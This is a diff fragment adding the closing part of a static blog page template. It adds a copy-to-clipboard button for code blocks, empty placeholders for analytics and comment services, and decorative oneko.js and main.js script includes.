+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+    <script src="/js/oneko.js"></script>
+</body>
+</html>
